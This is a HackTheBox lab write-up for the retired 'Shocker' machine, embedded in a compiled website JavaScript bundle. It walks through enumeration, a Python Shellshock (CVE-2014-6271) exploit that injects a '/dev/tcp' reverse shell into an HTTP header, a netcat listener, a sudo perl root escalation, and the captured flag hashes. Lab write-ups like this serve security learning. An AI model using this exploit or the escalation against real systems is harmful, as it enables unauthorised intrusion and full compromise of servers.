"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[2676],{23332:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>r,contentTitle:()=>h,default:()=>p,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"hacker/hackthebox/shocker","title":"HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation","description":"Complete walkthrough of HackTheBox Shocker machine. Learn Shellshock (CVE-2014-6271) vulnerability exploitation and Linux penetration testing.","source":"@site/docs/hacker/hackthebox/shocker.md","sourceDirName":"hacker/hackthebox","slug":"/hacker/hackthebox/shocker","permalink":"/docs/hacker/hackthebox/shocker","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/hackthebox/shocker.md","tags":[{"inline":true,"label":"hackthebox","permalink":"/docs/tags/hackthebox"},{"inline":true,"label":"shellshock","permalink":"/docs/tags/shellshock"},{"inline":true,"label":"vulnerability","permalink":"/docs/tags/vulnerability"},{"inline":true,"label":"linux","permalink":"/docs/tags/linux"},{"inline":true,"label":"web-exploitation","permalink":"/docs/tags/web-exploitation"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1758526302000,"sidebarPosition":3,"frontMatter":{"title":"HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation","description":"Complete walkthrough of HackTheBox Shocker machine. Learn Shellshock (CVE-2014-6271) vulnerability exploitation and Linux penetration testing.","keywords":["hackthebox shocker","shellshock","cve-2014-6271","bash vulnerability","linux exploitation","web application security"],"tags":["hackthebox","shellshock","vulnerability","linux","web-exploitation"],"sidebar_position":3},"sidebar":"docsSidebar","previous":{"title":"HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067","permalink":"/docs/hacker/hackthebox/legacy"},"next":{"title":"HackTheBox Lame Walkthrough - Classic Linux Exploitation and SMB Attacks","permalink":"/docs/hacker/hackthebox/lame"}}');var i=n(74848),a=n(28453);const o={title:"HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation",description:"Complete walkthrough of HackTheBox Shocker machine. Learn Shellshock (CVE-2014-6271) vulnerability exploitation and Linux penetration testing.",keywords:["hackthebox shocker","shellshock","cve-2014-6271","bash vulnerability","linux exploitation","web application security"],tags:["hackthebox","shellshock","vulnerability","linux","web-exploitation"],sidebar_position:3},h=void 0,r={},l=[{value:"KEY LEARNINGS",id:"key-learnings",level:2},{value:"RECON",id:"recon",level:2},{value:"NMAP",id:"nmap",level:3},{value:"EXPLOIT",id:"exploit",level:2},{value:"shellshock bug",id:"shellshock-bug",level:3},{value:"user.txt",id:"usertxt",level:3},{value:"PRIVESC",id:"privesc",level:2},{value:"root.txt",id:"roottxt",level:3}];function c(e){const t={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(t.admonition,{title:"Description",type:"info",children:[(0,i.jsxs)(t.p,{children:["These are my notes for the Shocker (Retired) Box on ",(0,i.jsx)(t.a,{href:"https://hackthebox.com",children:"HackTheBox"}),"."]}),(0,i.jsxs)(t.table,{children:[(0,i.jsx)(t.thead,{children:(0,i.jsxs)(t.tr,{children:[(0,i.jsx)(t.th,{style:{textAlign:"center"},children:"OS"}),(0,i.jsx)(t.th,{style:{textAlign:"center"},children:"Level"}),(0,i.jsx)(t.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,i.jsx)(t.tbody,{children:(0,i.jsxs)(t.tr,{children:[(0,i.jsx)(t.td,{style:{textAlign:"center"},children:"Linux"}),(0,i.jsx)(t.td,{style:{textAlign:"center"},children:"Easy"}),(0,i.jsx)(t.td,{style:{textAlign:"center"},children:"3/5"})]})})]})]}),"\n",(0,i.jsx)(t.h2,{id:"key-learnings",children:"KEY LEARNINGS"}),"\n",(0,i.jsx)(t.admonition,{type:"tip",children:(0,i.jsxs)(t.ol,{children:["\n",(0,i.jsx)(t.li,{children:"rinse all the wordlists for directory enumeration you can, enumerate thoroughly as the ONE small find may be the key to it all."}),"\n",(0,i.jsx)(t.li,{children:"I need a good directory enumeration playbook to work from e.g. know more switches like extension filtering"}),"\n"]})}),"\n",(0,i.jsx)(t.h2,{id:"recon",children:"RECON"}),"\n",(0,i.jsx)(t.h3,{id:"nmap",children:"NMAP"}),"\n",(0,i.jsxs)(t.p,{children:["run it all: ",(0,i.jsx)(t.code,{children:"sudo nmap -v 10.10.10.56 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-shocker.txt"})]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"PORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n| http-methods:\n|_  Supported Methods: POST OPTIONS GET HEAD\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n"})}),"\n",(0,i.jsx)(t.p,{children:"find vulns for"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsx)(t.li,{children:(0,i.jsx)(t.code,{children:"Apache httpd 2.4.18"})}),"\n",(0,i.jsx)(t.li,{children:(0,i.jsx)(t.code,{children:"OpenSSH 7.2p2"})}),"\n"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"723 \ud83d\udc80 \xb1 \u27a4 searchsploit apache 2.4.18                                                              [tun0: 10.10.16.2]\n------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                      |  Path\n------------------------------------------------------------------------------------ ---------------------------------\nApache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                     | php/remote/29290.c\nApache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                   | php/remote/29316.py\nApache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalati | linux/local/46676.php\nApache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                    | linux/webapps/42745.py\nApache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                 | multiple/dos/26710.txt\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                | unix/remote/21671.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)          | unix/remote/764.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)          | unix/remote/47080.c\nApache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                 | linux/webapps/39642.txt\nApache Tomcat < 5.5.17 - Remote Directory Listing                                   | multiple/remote/2061.txt\nApache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                 | unix/remote/14489.c\nApache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                           | multiple/remote/6229.txt\nApache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass /  | jsp/webapps/42966.py\nApache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass /  | windows/webapps/42953.txt\nApache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                        | linux/dos/36906.txt\nWebfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution    | linux/remote/34.pl\n"})}),"\n",(0,i.jsx)(t.p,{children:"check exploits for ssh"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"725 \ud83d\udc80 \xb1 \u27a4 searchsploit openssh 7.2p2                                                              [tun0: 10.10.16.2]\n------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                      |  Path\n------------------------------------------------------------------------------------ ---------------------------------\nOpenSSH 2.3 < 7.7 - Username Enumeration                                            | linux/remote/45233.py\nOpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                      | linux/remote/45210.py\nOpenSSH 7.2p2 - Username Enumeration                                                | linux/remote/40136.py\nOpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Pri | linux/local/40962.txt\nOpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                            | linux/remote/40963.txt\nOpenSSH < 7.7 - User Enumeration (2)                                                | linux/remote/45939.py\nOpenSSHd 7.2p2 - Username Enumeration                                               | linux/remote/40113.txt\n"})}),"\n",(0,i.jsxs)(t.p,{children:["tried the ",(0,i.jsx)(t.code,{children:"40136.py"})," exploit, just enumerates usernames... wasn't sure what to do even if I did verify a valid username..."]}),"\n",(0,i.jsx)(t.admonition,{title:"did not try harder",type:"danger",children:(0,i.jsxs)(t.p,{children:["Looked up this ",(0,i.jsx)(t.a,{href:"https://medium.com/@bl1nd/shocker-writeup-no-metasploit-c0a450b0295d",children:"walk-through"})," cos I'm tired af and cbf seeing this box through."]})}),"\n",(0,i.jsx)(t.p,{children:"The walk-through did several"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsx)(t.li,{children:"gobuster enumerations with different word lists (SecLists usually)"}),"\n",(0,i.jsxs)(t.li,{children:["did the OpenSSH 7.2p2 enumeration exploit, didn't really find much ",(0,i.jsx)(t.code,{children:"root"})," and ",(0,i.jsx)(t.code,{children:"toor"})]}),"\n",(0,i.jsx)(t.li,{children:"used hydra to try and bruteforce the ssh login - no luck"}),"\n",(0,i.jsx)(t.li,{children:"came back to enumerate dir again with gobuster"}),"\n"]}),"\n",(0,i.jsx)(t.h2,{id:"exploit",children:"EXPLOIT"}),"\n",(0,i.jsxs)(t.p,{children:['The box is called "shocker" so looked up "',(0,i.jsx)(t.a,{href:"https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf",children:"Shellshock bug"}),'", and its a bash shell vuln.']}),"\n",(0,i.jsx)(t.p,{children:"Bash shell aka *.sh"}),"\n",(0,i.jsx)(t.p,{children:"First gobuster run had these results:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"http://10.10.10.56/.                    (Status: 200) [Size: 137]\nhttp://10.10.10.56/.htaccess            (Status: 403) [Size: 295]\nhttp://10.10.10.56/.htaccess-dev        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccess-marco      (Status: 403) [Size: 301]\nhttp://10.10.10.56/.htaccess-local      (Status: 403) [Size: 301]\nhttp://10.10.10.56/.htaccess.bak1       (Status: 403) [Size: 300]\nhttp://10.10.10.56/.htaccess.inc        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccess.old        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccess.bak        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccess.orig       (Status: 403) [Size: 300]\nhttp://10.10.10.56/.htaccess.sample     (Status: 403) [Size: 302]\nhttp://10.10.10.56/.htaccess.txt        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccess.save       (Status: 403) [Size: 300]\nhttp://10.10.10.56/.htm                 (Status: 403) [Size: 290]\nhttp://10.10.10.56/.htaccessOLD2        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htaccessOLD         (Status: 403) [Size: 298]\nhttp://10.10.10.56/.htaccessBAK         (Status: 403) [Size: 298]\nhttp://10.10.10.56/.htaccess/           (Status: 403) [Size: 296]\nhttp://10.10.10.56/.html                (Status: 403) [Size: 291]\nhttp://10.10.10.56/.htpasswd-old        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htpasswd.bak        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.httr-oauth          (Status: 403) [Size: 297]\nhttp://10.10.10.56/.htpasswd.inc        (Status: 403) [Size: 299]\nhttp://10.10.10.56/.htpasswd/           (Status: 403) [Size: 296]\nhttp://10.10.10.56//                    (Status: 200) [Size: 137]\nhttp://10.10.10.56/cgi-bin/             (Status: 403) [Size: 294]\nhttp://10.10.10.56/icons/               (Status: 403) [Size: 292]\nhttp://10.10.10.56/index.html           (Status: 200) [Size: 137]\n"})}),"\n",(0,i.jsxs)(t.p,{children:["the walkthrough, saw ",(0,i.jsx)(t.code,{children:"http://10.10.10.56/cgi-bin/ (Status: 403) [Size: 294]"}),' and theorised that a "bash shell" bug would be in the ',(0,i.jsx)(t.code,{children:"/cgi-bin/"})," space (which makes sense)."]}),"\n",(0,i.jsxs)(t.p,{children:["Another gobuster run, with ",(0,i.jsx)(t.code,{children:"-x"})," for extensions, and target the ",(0,i.jsx)(t.code,{children:"/cgi-bin/"})," folder:"]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.code,{children:"gobuster dir -x cgi,php,sh,log, -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt"})}),"\n",(0,i.jsxs)(t.p,{children:["from the walkthroughm, I know a) ",(0,i.jsx)(t.code,{children:"http://10.10.10.56/cgi-bin/user.sh"})," exists."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"RxHackk \u798f ~/Repos/RxHack/HTB/BOXES/SHOCKER \u27a4 431f6ec|main\u26a1\n792 \ud83d\udc80 \xb1 \u27a4 gobuster dir -x cgi,php,sh,log, -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.56/cgi-bin/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              cgi,php,sh,log,\n[+] Timeout:                 10s\n===============================================================\n2022/04/09 23:58:55 Starting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 298]\n/.htpasswd.log        (Status: 403) [Size: 307]\n/.htaccess.cgi        (Status: 403) [Size: 307]\n/.htpasswd.           (Status: 403) [Size: 304]\n/.hta.cgi             (Status: 403) [Size: 302]\n/.htaccess.php        (Status: 403) [Size: 307]\n/.htpasswd            (Status: 403) [Size: 303]\n/.hta.php             (Status: 403) [Size: 302]\n/.htaccess.sh         (Status: 403) [Size: 306]\n/.hta.sh              (Status: 403) [Size: 301]\n/.htpasswd.cgi        (Status: 403) [Size: 307]\n/.htaccess.log        (Status: 403) [Size: 307]\n/.hta.log             (Status: 403) [Size: 302]\n/.htpasswd.php        (Status: 403) [Size: 307]\n/.htaccess.           (Status: 403) [Size: 304]\n/.hta.                (Status: 403) [Size: 299]\n/.htaccess            (Status: 403) [Size: 303]\n/.htpasswd.sh         (Status: 403) [Size: 306]\n/user.sh              (Status: 200) [Size: 118] <----------found it!\n\n===============================================================\n2022/04/10 00:21:35 Finished\n===============================================================\n"})}),"\n",(0,i.jsx)(t.p,{children:"---------working on it myself from this point----------"}),"\n",(0,i.jsxs)(t.p,{children:['looked up "shellshock" found ',(0,i.jsx)(t.a,{href:"https://nmap.org/nsedoc/scripts/http-shellshock.html",children:"nmap shellshock scripts"})]}),"\n",(0,i.jsx)(t.p,{children:"confirms it:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"807 \ud83d\udc80 \xb1 \u27a4 nmap -sV -p 80,2222 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 00:19 NZST\nNmap scan report for 10.10.10.56\nHost is up (0.28s latency).\n\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-shellshock:\n|   VULNERABLE:\n|   HTTP Shellshock vulnerability\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2014-6271\n|       This web application might be affected by the vulnerability known\n|       as Shellshock. It seems the server is executing commands injected\n|       via malicious HTTP headers.\n|\n|     Disclosure date: 2014-09-24\n|     References:\n|       http://www.openwall.com/lists/oss-security/2014/09/24/10\n|       http://seclists.org/oss-sec/2014/q3/685\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(t.h3,{id:"shellshock-bug",children:"shellshock bug"}),"\n",(0,i.jsxs)(t.p,{children:["found this: ",(0,i.jsx)(t.a,{href:"https://pastebin.com/raw/166f8Rjx",children:"https://pastebin.com/raw/166f8Rjx"})]}),"\n",(0,i.jsx)(t.p,{children:"added the hash-bang"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-python",children:'#!/usr/bin/env python2\n\n#\n#CVE-2014-6271 cgi-bin reverse shell\n#\n\nimport httplib,urllib,sys\n\nif (len(sys.argv)<4):\n  print "Usage: %s <host /> <vulnerable CGI /> <attackhost/IP />" % sys.argv[0]\n  print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]\n  exit(0)\n\nconn = httplib.HTTPConnection(sys.argv[1])\nreverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]\n\nheaders = {"Content-type": "application/x-www-form-urlencoded",\n  "test":reverse_shell }\nconn.request("GET",sys.argv[2],headers=headers)\nres = conn.getresponse()\nprint res.status, res.reason\ndata = res.read()\nprint data\n'})}),"\n",(0,i.jsx)(t.p,{children:"execute with listener open:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"RxHackk \u798f ~/Repos/RxHack/HTB/BOXES/SHOCKER/foothold \u27a4 431f6ec|main\u26a1\n819 \ud83d\udc80 \xb1 \u27a4 ./shocker.py 10.10.10.56 /cgi-bin/user.sh 10.10.16.2/443\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nRxHackk \u798f ~/Repos/RxHack/HTB/BOXES/SHOCKER \u27a4 431f6ec|main\u26a1\n817 \ud83d\udc80 \xb1 \u27a4 sudo rlwrap nc -lvrp 443\nlistening on [any] 443 ...\n10.10.10.56: inverse host lookup failed: Unknown host\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.56] 33484\nbash: no job control in this shell\nshelly@Shocker:/usr/lib/cgi-bin$\n"})}),"\n",(0,i.jsx)(t.h3,{id:"usertxt",children:"user.txt"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"shelly@Shocker:/home/shelly$ ls\nuser.txt\ncat user.txt\ncat user.txt\n2ec24e11320026d1e70ff3e16695b233\nshelly@Shocker:/home/shelly$\n"})}),"\n",(0,i.jsx)(t.h2,{id:"privesc",children:"PRIVESC"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"sudo -l\nMatching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl\nshelly@Shocker:/home/shelly$\n"})}),"\n",(0,i.jsx)(t.h3,{id:"roottxt",children:"root.txt"}),"\n",(0,i.jsx)(t.p,{children:"perl shell ftw"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"sudo /usr/bin/perl -e 'exec \"/bin/sh\";'\nid\nuid=0(root) gid=0(root) groups=0(root)\nls /root\nroot.txt\ncat /root/root.txt\n52c2715605d70c7619030560dc1ca467\n"})})]})}function p(e={}){const{wrapper:t}={...(0,a.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>o,x:()=>h});var s=n(96540);const i={},a=s.createContext(i);function o(e){const t=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function h(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:t},e.children)}}}]);